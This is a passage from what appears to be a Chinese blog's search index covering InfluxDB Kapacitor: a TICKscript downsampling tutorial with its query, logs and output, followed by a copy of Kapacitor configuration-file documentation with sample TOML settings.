该if函数的返回类型相同类型作为其第二个和第三个参数。 1if(condition, true expression, false expression)","link":"/2020/04/14/booboo_tick/kapacitor/02_TICKscript%E8%AF%AD%E8%A8%80/I_TICKscriptLambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"title":"05-Kapacitor监控案例-B-降采样","text":"降采样 概念 Batch Task 要求 解题过程 1. 画出DAG图 2. 编写 TICKscript 3. 启动后查看日志 4. 查看数据库 降采样概念维基百科解释 在数位信号处理领域中，降采样，又作减采集,是一种多速率数字信号处理的技术或是降低信号采样率的过程，通常用于降低数据传输速率或者数据大小。 在具体的业务场景当中，我们也往往不需要太高的精度，比如查看一年的股票走势，我们把精度下降到天为单位就能满足需求，同时也能提高处理速度。 Batch Task 要求批量获取 Influxdb数据库中 库名database：telegraf.autogen 测量名measurement：cpu 时间窗口:近1天 计算每个主机的cpu=cpu-total的usage_idle每小时的平均值 输出到日志中； 输出到influxdb数据中： 库：output_db.autogen 测量名:cpu_one_hour 解题过程123456789101112131415161718192021222324252627282930&gt; SELECT mean(&quot;usage_idle&quot;) as mean_usage_idle FROM &quot;cpu&quot; WHERE cpu = &apos;cpu-total&apos; and time &gt;= now()-1d GROUP BY time(1h),cpu,host fill(null)name: cputags: cpu=cpu-total, host=influxdbtime mean_usage_idle---- ---------------1567918800000000000 97.936190081782431567922400000000000 97.935624877218871567926000000000000 97.949699240860211567929600000000000 97.942231795893621567933200000000000 97.916417727384911567936800000000000 97.93145435232251567940400000000000 97.940605593013191567944000000000000 97.901472390220431567947600000000000 97.760357670484231567951200000000000 97.866048141999091567954800000000000 97.933333844742441567958400000000000 97.923441411868541567962000000000000 97.969618091404751567965600000000000 97.981920068039911567969200000000000 97.963565642567391567972800000000000 98.019169635010211567976400000000000 97.992844016892961567980000000000000 97.991487886455321567983600000000000 97.972122850288171567987200000000000 98.009858097176091567990800000000000 97.96920643094431567994400000000000 97.943062245191041567998000000000000 97.955174283646711568001600000000000 97.929467565455971568005200000000000 97.92342386210187 1. 画出DAG图1234graph LR; A(BatchNode)--&gt;B B(QueryNode)--&gt;C C(LogNode)--&gt;F(InfluxDBOutNode) 2. 编写 TICKscript123456789101112131415// cpu_batch.tickdbrp &quot;telegraf&quot;.&quot;autogen&quot;batch |query(&apos;&apos;&apos;SELECT mean(&quot;usage_idle&quot;) as mean_usage_idle FROM telegraf.autogen.cpu WHERE cpu = &apos;cpu-total&apos; &apos;&apos;&apos;) .period(24h) .every(24h) .groupBy(time(1h), &apos;cpu&apos;, &apos;host&apos;) |log() |influxDBOut() .create() .database(&apos;output_db&apos;) .retentionPolicy(&apos;autogen&apos;) .measurement(&apos;cpu_one_hour&apos;) 每天查询一次InfluxDB; 返回的时间窗口跨越24小时，将数据点从1分钟降低到1h一个点。 3. 启动后查看日志12345678910111213141516171819202122232425262728ts=2019-09-09T14:38:53.829+08:00 lvl=debug msg=&quot;starting next batch query&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 query=&quot;SELECT mean(usage_idle) AS mean_usage_idle FROM telegraf.autogen.cpu WHERE cpu = &apos;cpu-total&apos; AND time &gt;= &apos;2019-09-08T06:38:53.829083954Z&apos; AND time &lt; &apos;2019-09-09T06:38:53.829083954Z&apos; GROUP BY time(1h, 0s), cpu, host&quot;ts=2019-09-09T14:38:53.831+08:00 lvl=info msg=&quot;begin batch&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb time=2019-09-09T06:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.9417652419907 time=2019-09-08T06:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.94969924086021 time=2019-09-08T07:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.94223179589362 time=2019-09-08T08:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.91641772738491 time=2019-09-08T09:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.9314543523225 time=2019-09-08T10:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.94060559301319 time=2019-09-08T11:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.90147239022043 time=2019-09-08T12:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_host=influxdb tag_cpu=cpu-total field_mean_usage_idle=97.76035767048423 time=2019-09-08T13:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_host=influxdb tag_cpu=cpu-total field_mean_usage_idle=97.86604814199909 time=2019-09-08T14:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.93333384474244 time=2019-09-08T15:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_host=influxdb tag_cpu=cpu-total field_mean_usage_idle=97.92344141186854 time=2019-09-08T16:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.96961809140475 time=2019-09-08T17:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.98192006803991 time=2019-09-08T18:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_host=influxdb tag_cpu=cpu-total field_mean_usage_idle=97.96356564256739 time=2019-09-08T19:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=98.01916963501021 time=2019-09-08T20:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.99284401689296 time=2019-09-08T21:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.99148788645532 time=2019-09-08T22:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_host=influxdb tag_cpu=cpu-total field_mean_usage_idle=97.97212285028817 time=2019-09-08T23:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=98.00985809717609 time=2019-09-09T00:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.9692064309443 time=2019-09-09T01:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_host=influxdb tag_cpu=cpu-total field_mean_usage_idle=97.94306224519104 time=2019-09-09T02:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.95517428364671 time=2019-09-09T03:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.92946756545597 time=2019-09-09T04:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.92929794506509 time=2019-09-09T05:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.95361354221568 time=2019-09-09T06:00:00Zts=2019-09-09T14:38:53.832+08:00 lvl=info msg=&quot;end batch&quot; service=kapacitor task_master=main task=cpu_batch node=influxdb_out3 prefix= name=cpu group=cpu=cpu-total,host=influxdb tag_cpu=cpu-total tag_host=influxdb time=2019-09-09T06:00:00Z 4. 查看数据库1234567891011121314151617181920212223242526272829[root@tick:/var/lib/kapacitor/task]# zy_influx -database output_db -execute &apos;select * from cpu_one_hour&apos;name: cpu_one_hourtime cpu host mean_usage_idle---- --- ---- ---------------1567922400000000000 cpu-total influxdb 97.935417336642861567926000000000000 cpu-total influxdb 97.949699240860211567929600000000000 cpu-total influxdb 97.942231795893621567933200000000000 cpu-total influxdb 97.916417727384911567936800000000000 cpu-total influxdb 97.93145435232251567940400000000000 cpu-total influxdb 97.940605593013191567944000000000000 cpu-total influxdb 97.901472390220431567947600000000000 cpu-total influxdb 97.760357670484231567951200000000000 cpu-total influxdb 97.866048141999091567954800000000000 cpu-total influxdb 97.933333844742441567958400000000000 cpu-total influxdb 97.923441411868541567962000000000000 cpu-total influxdb 97.969618091404751567965600000000000 cpu-total influxdb 97.981920068039911567969200000000000 cpu-total influxdb 97.963565642567391567972800000000000 cpu-total influxdb 98.019169635010211567976400000000000 cpu-total influxdb 97.992844016892961567980000000000000 cpu-total influxdb 97.991487886455321567983600000000000 cpu-total influxdb 97.972122850288171567987200000000000 cpu-total influxdb 98.009858097176091567990800000000000 cpu-total influxdb 97.96920643094431567994400000000000 cpu-total influxdb 97.943062245191041567998000000000000 cpu-total influxdb 97.955174283646711568001600000000000 cpu-total influxdb 97.929467565455971568005200000000000 cpu-total influxdb 97.929297945065091568008800000000000 cpu-total influxdb 97.95526618492178","link":"/2020/04/14/booboo_tick/kapacitor/05_Kapacitor%E7%9B%91%E6%8E%A7%E6%A1%88%E4%BE%8B/02_%E9%99%8D%E9%87%87%E6%A0%B7/"},{"title":"03-Kapcitor配置文件-A-配置文件简介","text":"官方文档 Contents Startup Systemd Kapacitor configuration file TOML Organization Example: An InfluxDB connection grouping Kapacitor environment variables Environment variables not in configuration file Mapping properties to environment variables Configuring with the HTTP API 官方文档Configuring Kapacitor Contents Startup Kapacitor configuration file Kapacitor environment variables Configuring with the HTTP API Basic installation and startup of the Kapacitor service is covered inGetting started with Kapacitor.The basic principles of working with Kapacitor described there should be understood before continuing here.This document presents Kapacitor configuration in greater detail. Kapacitor service properties are configured using key-value pairs organizedinto groups.Any property key can be located by following its path in the configuration file (for example, [http].https-enabled or [slack].channel).Values for configuration keys are declared in the configuration file.On POSIX systems this file is located by default at the following location: /etc/kapacitor/kapacitor.conf. On Windows systems a sample configuration file can be found in the same directory as the kapacitord.exe.The location of this file can be defined at startup with the -config argument.The path to the configuration file can also be declared using the environment variable KAPACITOR_CONFIG_PATH.Values declared in this file can be overridden by environment variables beginning with the token KAPACITOR_.Some values can also be dynamically altered using the HTTP API when the key [config-override].enabled is set to true. Four primary mechanisms for configuring different aspects of the Kapacitor service are available and listed here in the descending order by which they may be overridden: The configuration file. Environment variables. The HTTP API (for optional services and the InfluxDB connection). Command line arguments (for changing hostname and logging). Note: Setting the property skip-config-overrides in the configuration file to true will disable configuration overrides at startup. StartupThe Kapacitor daemon includes command line options that affect how it loads andruns.These include: -config: Path to the configuration file. -hostname: Hostname that will override the hostname specified in the configuration file. -pidfile: File where the process ID will be written. -log-file: File where logs will be written. -log-level: Threshold for writing messages to the log file. Valid values include debug, info, warn, error. SystemdOn POSIX systems, when the Kapacitor daemon starts as part of systemd, environment variables can be set in the file /etc/default/kapacitor. Start Kapacitor as part of systemd: 1$ sudo systemctl enable kapacitor Start Kapacitor as part of systemd and start Kapacitor immediately: 1sudo systemctl enable kapacitor —-now Define where the PID file and log file will be written: Add a line like the following into the /etc/default/kapacitor file: 1KAPACITOR_OPTS=&quot;-pidfile=/home/kapacitor/kapacitor.pid -log-file=/home/kapacitor/logs/kapacitor.log&quot; Restart Kapacitor: 1sudo systemctl restart kapacitor The environment variable KAPACITOR_OPTS is one of a few special variables usedby Kapacitor at startup.For more information on working with environment variables,see Kapacitor environment variablesbelow. Kapacitor configuration fileThe default configuration can be displayed using the config command of the Kapacitor daemon. 1kapacitord config A sample configuration file is also available in the Kapacitor code base.The most current version can be accessed on github. To get current configuration settings, you can use the Kapacitor HTTP API to get configuration values for settings that can be changed while the Kapacitor service is running. See Retrieving the current configuration. TOMLThe configuration file is based on TOML.Important configuration properties are identified by case-sensitive keysto which values are assigned.Key-value pairs are grouped into tables whose identifiers are delineated by brackets.Tables can also be grouped into table arrays. The most common value types found in the Kapacitor configuration file includethe following: String (declared in double quotes) Examples: host = &quot;localhost&quot;, id = &quot;myconsul&quot;, refresh-interval = &quot;30s&quot;. Integer Examples: port = 80, timeout = 0, udp-buffer = 1000. Float Example: threshold = 0.0. Boolean Examples: enabled = true, global = false, no-verify = false. Array – Examples: my_database = [ &quot;default&quot;, &quot;longterm&quot; ], urls = [&quot;http://localhost:8086&quot;] Inline Table Example: basic-auth = { username = &quot;my-user&quot;, password = &quot;my-pass&quot; } Table grouping identifiers are declared within brackets.For example, [http], [deadman],[kubernetes]. An array of tables is declared within double brackets.For example, [[influxdb]]. [[mqtt]], [[dns]]. OrganizationMost keys are declared in the context of a table grouping, but the basic properties of the Kapacitor system are defined in the root context of the configuration file.The four basic properties of the Kapacitor service include: hostname: String declaring the DNS hostname where the Kapacitor daemon runs. data_dir: String declaring the file system directory where core Kapacitor data is stored. skip-config-overrides: Boolean indicating whether or not to skip configuration overrides. default-retention-policy: String declaring the default retention policy to be used on the InfluxDB database. Table groupings and arrays of tables follow the basic properties and include essential and optional features,including specific alert handlers and mechanisms for service discovery and data scraping. Essential tablesHTTPThe Kapacitor service requires an HTTP connection and importantHTTP properties,such as a bind address and the path to an HTTPS certificate,are defined in the [http] table. Example: The HTTP grouping 12345678910111213141516...[http] # HTTP API Server for Kapacitor # This server is always on, # it serves both as a write endpoint # and as the API endpoint for all other # Kapacitor calls. bind-address = &quot;:9092&quot; log-enabled = true write-tracing = false pprof-enabled = false https-enabled = false https-certificate = &quot;/etc/ssl/influxdb-selfsigned.pem&quot; ### Use a separate private key location. # https-private-key = &quot;&quot;... Transport Layer Security (TLS) settingsIf the TLS configuration settings is not specified, Kapacitor supports all of the cipher suite IDs listed and all of the TLS versions implemented in the Constants section of the Go crypto/tls package documentation, depending on the version of Go used to build InfluxDB.Use the SHOW DIAGNOSTICS command to see the version of Go used to build Kapacitor. ciphers = [ &quot;TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305&quot;, &quot;TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256&quot;,]Determines the available set of cipher suites. For a list of available ciphers, which depends on the version of Go, see https://golang.org/pkg/crypto/tls/#pkg-constants.You can use the query SHOW DIAGNOSTICS to see the version of Go used to build Kapacitor.If not specified, uses the default settings from Go’s crypto/tls package. min-version = &quot;tls1.2&quot;Minimum version of the tls protocol that will be negotiated. If not specified, uses the default settings from the Go crypto/tls package. max-version = &quot;tls1.2&quot;Maximum version of the tls protocol that will be negotiated. If not specified, uses the default settings from the Go crypto/tls package. Recommended configuration for “modern compatibility”InfluxData recommends configuring your Kapacitor server’s TLS settings for “modern compatibility” — this provides a higher level of security and assumes that backward compatibility is not required.Our recommended TLS configuration settings for ciphers, min-version, and max-version are based on Mozilla’s “modern compatibility” TLS server configuration described in Security/Server Side TLS. InfluxData’s recommended TLS settings for “modern compatibility” are specified in the following configuration settings example. 1234567891011ciphers = [ &quot;TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305&quot;, &quot;TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305&quot;, &quot;TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256&quot;, &quot;TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256&quot;, &quot;TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384&quot;, &quot;TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384&quot;]min-version = &quot;tls1.2&quot;max-version = &quot;tls1.2&quot; Important:* The order of the cipher suite IDs in the ciphers setting determines which algorithms are selected by priority. The TLS min-version and the max-version settings restrict support to TLS 1.2. Config overrideThe [config-override] table contains only one key which enables or disables the ability tooverride certain values through the HTTP API. It is enabled by default. Example: The Config Override grouping 12345...[config-override] # Enable/Disable the service for overridding configuration via the HTTP API. enabled = true... LoggingThe Kapacitor service uses logging to monitor and inspect its behavior.The path to the log and the log threshold is defined in [logging] table. Example: The Logging grouping 123456789...[logging] # Destination for logs # Can be a path to a file or &apos;STDOUT&apos;, &apos;STDERR&apos;. file = &quot;/var/log/kapacitor/kapacitor.log&quot; # Logging level can be one of: # DEBUG, INFO, WARN, ERROR, or OFF level = &quot;INFO&quot;... LoadStarting with Kapacitor 1.4, the Kapacitor service includes a featurethat enables the loading of TICKscript tasks when the service loads.The path to these scripts is defined in this table. Example: The Load grouping 12345678...[load] # Enable/Disable the service for loading tasks/templates/handlers # from a directory enabled = true # Directory where task/template/handler files are set dir = &quot;/etc/kapacitor/load&quot;... ReplayThe Kapacitor client application can record data streams and batches for testingtasks before they are enabled.This table contains one key which declares the path to the directory where the replay files are to be stored. Example: The Replay grouping 12345...[replay] # Where to store replay files, aka recordings. dir = &quot;/var/lib/kapacitor/replay&quot;... TaskPrior to Kapacitor 1.4, tasks were written to a special task database.This table and its associated keys are deprecated and should only be used formigration purposes. StorageThe Kapacitor service stores its configuration and other information in the key-value Bolt database.The location of this database on the file system is defined in the storage tablegrouping. Example: The Storage grouping 12345...[storage] # Where to store the Kapacitor boltdb database boltdb = &quot;/var/lib/kapacitor/kapacitor.db&quot;... DeadmanKapacitor provides a deadman’s switch alert which can be configured globallyin this table grouping.See the Deadman helper function topic in the AlertNode documentation. For a Deadman’s switch to work it needs a threshold below which the switch willbe triggered. It also needs a polling interval as well as an id and messagewhich will be passed to the alert handler. Example: The Deadman grouping 123456789101112131415...[deadman] # Configure a deadman&apos;s switch # Globally configure deadman&apos;s switches on all tasks. # NOTE: for this to be of use you must also globally configure at least one alerting method. global = false # Threshold, if globally configured the alert will be triggered if the throughput in points/interval is &lt;= threshold. threshold = 0.0 # Interval, if globally configured the frequency at which to check the throughput. interval = &quot;10s&quot; # Id: the alert Id, NODE_NAME will be replaced with the name of the node being monitored. id = &quot;node &apos;NODE_NAME&apos; in task &apos;{{ .TaskName }}&apos;&quot; # The message of the alert. INTERVAL will be replaced by the interval. message = &quot;{{ .ID }} is {{ if eq .Level \\&quot;OK\\&quot; }}alive{{ else }}dead{{ end }}: {{ index .Fields \\&quot;collected\\&quot; | printf \\&quot;%0.3f\\&quot; }} points/INTERVAL.&quot;... InfluxDBKapacitor’s main purpose processing between nodes within an InfluxDB Enterprise cluster or between multiple clusters.You must define at least one [[influxdb]] table array configuration for an InfluxDB connection.Multiple InfluxDB table array configurations can be specified,but one InfluxDB table array configuration must be flagged as the default. Example: An InfluxDB connection groupingscript1234{{% note %}}To use Kapacitor with an InfluxDB instance that requires authentication,it must authenticate using an InfluxDB user with **read and write** permissions.{{% /note %}} 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788...[[influxdb]] # Connect to an InfluxDB cluster # Kapacitor can subscribe, query and write to this cluster. # Using InfluxDB is not required and can be disabled. enabled = true default = true name = &quot;localhost&quot; urls = [&quot;http://localhost:8086&quot;] username = &quot;&quot; password = &quot;&quot; timeout = 0 # Absolute path to pem encoded CA file. # A CA can be provided without a key/cert pair # ssl-ca = &quot;/etc/kapacitor/ca.pem&quot; # Absolutes paths to pem encoded key and cert files. # ssl-cert = &quot;/etc/kapacitor/cert.pem&quot; # ssl-key = &quot;/etc/kapacitor/key.pem&quot; # Do not verify the TLS/SSL certificate. # This is insecure. insecure-skip-verify = false # Maximum time to try and connect to InfluxDB during startup startup-timeout = &quot;5m&quot; # Turn off all subscriptions disable-subscriptions = false # Subscription mode is either &quot;cluster&quot; or &quot;server&quot; subscription-mode = &quot;server&quot; # Which protocol to use for subscriptions # one of &apos;udp&apos;, &apos;http&apos;, or &apos;https&apos;. subscription-protocol = &quot;http&quot; # Subscriptions resync time interval # Useful if you want to subscribe to new created databases # without restart Kapacitord subscriptions-sync-interval = &quot;1m0s&quot; # Override the global hostname option for this InfluxDB cluster. # Useful if the InfluxDB cluster is in a separate network and # needs special configuration to connect back to this Kapacitor instance. # Defaults to `hostname` if empty. kapacitor-hostname = &quot;&quot; # Override the global http port option for this InfluxDB cluster. # Useful if the InfluxDB cluster is in a separate network and # needs special configuration to connect back to this Kapacitor instance. # Defaults to the port from `[http] bind-address` if 0. http-port = 0 # Host part of a bind address for UDP listeners. # For example if a UDP listener is using port 1234 # and `udp-bind = &quot;hostname_or_ip&quot;`, # then the UDP port will be bound to `hostname_or_ip:1234` # The default empty value will bind to all addresses. udp-bind = &quot;&quot; # Subscriptions use the UDP network protocl. # The following options of for the created UDP listeners for each subscription. # Number of packets to buffer when reading packets off the socket. udp-buffer = 1000 # The size in bytes of the OS read buffer for the UDP socket. # A value of 0 indicates use the OS default. udp-read-buffer = 0 [influxdb.subscriptions] # Set of databases and retention policies to subscribe to. # If empty will subscribe to all, minus the list in # influxdb.excluded-subscriptions # # Format # db_name = &lt;list of retention policies&gt; # # Example: # my_database = [ &quot;default&quot;, &quot;longterm&quot; ] [influxdb.excluded-subscriptions] # Set of databases and retention policies to exclude from the subscriptions. # If influxdb.subscriptions is empty it will subscribe to all # except databases listed here. # # Format # db_name = &lt;list of retention policies&gt; # # Example: # my_database = [ &quot;default&quot;, &quot;longterm&quot; ]... InternalsKapacitor includes internal services that can be enabled or disabled andthat have properties that need to be defined. HTTP PostThe HTTP Post service configuration is commented out by default. It is used forPOSTing alerts to an HTTP endpoint. ReportingKapacitor will send usage statistics back to InfluxData.This feature can be disabled or enabled in the [reporting] table grouping. Example 9 – Reporting configuration1234567...[reporting] # Send usage statistics # every 12 hours to Enterprise. enabled = true url = &quot;https://usage.influxdata.com&quot;... StatsInternal statistics about Kapacitor can also be emitted to an InfluxDB database.The collection frequency and the database to which the statistics are emittedcan be configured in the [stats] table grouping. Example: Stats configuration 123456789101112131415...[stats] # Emit internal statistics about Kapacitor. # To consume these stats create a stream task # that selects data from the configured database # and retention policy. # # Example: # stream|from().database(&apos;_kapacitor&apos;).retentionPolicy(&apos;autogen&apos;)... # enabled = true stats-interval = &quot;10s&quot; database = &quot;_kapacitor&quot; retention-policy= &quot;autogen&quot;# ... AlertKapacitor includes global alert configuration options that apply to all alertscreated by the alertNode 1234[alert] # Persisting topics can become an I/O bottleneck under high load. # This setting disables them entirely. persist-topics = false Optional table groupingsOptional table groupings are disabled by default and relate to specific features that can be leveraged by TICKscript nodes or used to discover and scrape information from remote locations.In the default configuration, these optional table groupings may be commented out or include a key enabled set to false (i.e., enabled = false).A feature defined by an optional table should be enabled whenever a relevant node or a handler for a relevant node is required by a task, or when an input source is needed. For example, if alerts are to be sent via email, then the SMTP service shouldbe enabled and configured in the [smtp] properties table. Example 11 – Enabling SMTP 12345678910111213141516171819202122232425262728...[smtp] # Configure an SMTP email server # Will use TLS and authentication if possible # Only necessary for sending emails from alerts. enabled = true host = &quot;192.168.1.24&quot; port = 25 username = &quot;schwartz.pudel&quot; password = &quot;f4usT!1808&quot; # From address for outgoing mail from = &quot;kapacitor@test.org&quot; # List of default To addresses. to = [&quot;heinrich@urfaust.versuch.de&quot;,&quot;valentin@urfaust.versuch.de&quot;,&quot;wagner@urfaust.versuch.de&quot;] # Skip TLS certificate verify when connecting to SMTP server no-verify = false # Close idle connections after timeout idle-timeout = &quot;30s&quot; # If true the all alerts will be sent via Email # without explicitly marking them in the TICKscript. global = false # Only applies if global is true. # Sets all alerts in state-changes-only mode, # meaning alerts will only be sent if the alert state changes. state-changes-only = false# ... Optional features include supported alert handlers, Docker services, user defined functions, input services, and discovery services. Supported event handlersEvent handlers manage communications from Kapacitor to third party services oracross Internet standard messaging protocols.They are activated through chaining methods on the Alert node. Most of the handler configurations include common properties.Every handler has the property enabled. They also need an endpoint to whichmessages can be sent.Endpoints may include single properties (e.g, url and addr) or property pairs (e.g., host and port).Most also include an authentication mechanism such as a token or a pair of properties like username and password.A sample SMTP configuration is shown in Example 11 above. Specific properties are included directly in the configuration file anddiscussed along with the specific handler information in the Alertdocument. The following handlers are currently supported: Alerta: Sending alerts to Alerta. Email: To send alerts by email. HipChat: Sending alerts to the HipChat service. Kafka: Sending alerts to an Apache Kafka cluster. MQTT: Publishing alerts to an MQTT broker. OpsGenie: Sending alerts to the OpsGenie service. PagerDuty: Sending alerts to the PagerDuty service. Pushover: Sending alerts to the Pushover service. Sensu: Sending alerts to Sensu. Slack: Sending alerts to Slack. SNMP Trap: Posting to SNMP traps. Talk: Sending alerts to the Talk service. Telegram: Sending alerts to Telegram. VictorOps: Sending alerts to the VictorOps service. Docker servicesKapacitor can be used to trigger changes in Docker clusters. Thisis activated by the SwarmAutoScaleand the K8sAutoScale nodes. The following service configurations corresponding to these chaining methods canbe found in the configuration file: Swarm Example 12 – The Docker Swarm configuration* 1234567891011121314151617 ... [[swarm]]# Enable/Disable the Docker Swarm service.# Needed by the swarmAutoscale TICKscript node.enabled = false# Unique ID for this Swarm cluster# NOTE: This is not the ID generated by Swarm rather a user defined# ID for this cluster since Kapacitor can communicate with multiple clusters.id = &quot;&quot;# List of URLs for Docker Swarm servers.servers = [&quot;http://localhost:2376&quot;]# TLS/SSL Configuration for connecting to secured Docker daemonsssl-ca = &quot;&quot;ssl-cert = &quot;&quot;ssl-key = &quot;&quot;insecure-skip-verify = false... Kubernetes Example: The Kubernetes configuration* 12345678910111213141516171819202122232425262728 ... [kubernetes]# Enable/Disable the kubernetes service.# Needed by the k8sAutoscale TICKscript node.enabled = false# There are several ways to connect to the kubernetes API servers:## Via the proxy, start the proxy via the `kubectl proxy` command:# api-servers = [&quot;http://localhost:8001&quot;]## From within the cluster itself, in which case# kubernetes secrets and DNS services are used# to determine the needed configuration.# in-cluster = true## Direct connection, in which case you need to know# the URL of the API servers, the authentication token and# the path to the ca cert bundle.# These value can be found using the `kubectl config view` command.# api-servers = [&quot;http://192.168.99.100:8443&quot;]# token = &quot;...&quot;# ca-path = &quot;/path/to/kubernetes/ca.crt&quot;## Kubernetes can also serve as a discoverer for scrape targets.# In that case the type of resources to discoverer must be specified.# Valid values are: &quot;node&quot;, &quot;pod&quot;, &quot;service&quot;, and &quot;endpoint&quot;.# resource = &quot;pod&quot; ... User defined functions (UDFs)Kapacitor can be used to plug in a user defined function(UDF), which can then be leveraged aschaining methods 